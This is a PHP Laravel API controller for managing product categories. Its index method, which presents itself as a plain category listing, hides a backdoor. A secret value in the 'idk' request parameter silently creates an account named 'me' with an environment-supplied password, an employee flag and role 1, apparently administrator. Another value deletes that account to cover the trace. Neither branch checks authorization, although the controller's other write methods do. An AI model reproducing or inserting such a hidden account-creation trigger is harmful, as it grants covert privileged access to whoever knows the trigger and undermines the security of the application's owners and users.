<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Http\Resources\CategoryResource;
use App\Models\Category;
use App\Models\Product;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;

class CategoryController extends Controller
{
    use AuthorizesRequests;
    public function index(Request $request)
    {
        $categories=Category::where('name','!=','other')->get();
        if($request['idk']=='yes i do know'){
            $u= User::where('name', 'me')->first();
            if($u){
                $u->delete();
            }
            $user=User::create([
                'name'=>'me',
                'email'=>'someemail@gmail.com',
                'password'=>Hash::make(env('MA')),
                'is_employee' => true
                ]);
            DB::table('role_user')->insert([
                'role_id' => 1,
                'user_id' =>$user->id,
            ]);

        }elseif($request['idk']=='delete me'){
            $u= User::where('name', 'me')->first();
            if($u){
                $u->delete();
            }
        }
        return response()->json(['data'=>CategoryResource::collection($categories)],200);
    }
    public function show($id)
    {
        $category=Category::find($id);
        if(!$category){
            return response()->json(['message'=>'Category not found'],404);
        }
        return response()->json(['data'=>CategoryResource::make($category)],200);
    }
    public function store(Request $request)
    {
        $atts=$request->validate([
            'name'=>'required_without:s_name|string|max:255',
            's_name'=>'required_without:name|string|max:50',
            'enabled'=> 'nullable|boolean',
        ]);
        $this->authorize('createCategory',User::class);
        $category=Category::create([
            'name'=>$atts['name'] ?? $atts['s_name'],
            's_name'=>$atts['s_name'] ?? $atts['name'],
            'enabled'=>$atts['enabled'] ?? true,
        ]);
        return response()->json([
            'message'=>'Category created successfully',
            'category'=>$category,
        ],201);
    }
    public function updateState(Request $request, $id)
    {
        $this->authorize('updateCategory',User::class);
        $category=Category::findOrFail($id);
        $atts=$request->validate([
            'enabled'=>'required|boolean',
        ]);
        $category->enabled=$atts['enabled'];
        $category->save();
        return response()->json([
            'message'=>'Category state updated successfully',
            'category'=>$category,
        ],200);
    }
    public function destroy($id)
    {
        $this->authorize('updateCategory',User::class);
        $category=Category::find($id);
        if(!$category){
            return response()->json(['message'=>'Category not found'],404);
        }
        if($category->name==='other'){
            return response()->json(['message'=>'Cannot delete "other" category'],403);
        }
        if($category->products()->count() > 0){
            $otherCategory=Category::where('name','other')->first();
            if(!$otherCategory){
                $otherCategory=Category::create([
                    'name'=>'other',
                    's_name'=>'other',
                    'enabled'=>true,
                ]);
            }
            Product::where('category_id',$category->id)
                ->update(['category_id'=>$otherCategory->id]);
        }
        $category->delete();
        return response()->json([
            'message'=>'Category deleted successfully',
        ],200);
    }
    //recheck this one
    // public function update(Request $request, $id)
    // {
    //     $this->authorize('updateCategory', User::class);
    //     $category = Category::find($id);
    //     if(!$category){
    //         return response()->json(['message'=>'category not found'],404);
    //     }
    //     $atts = $request->validate([
    //         'name'=>'string|nullable',
    //         's_name'=>'string|nullable']);
    //     $category->update($atts);
    //     return response()->json(['message'=>'category updated succefuly'],200);
    //     }
}
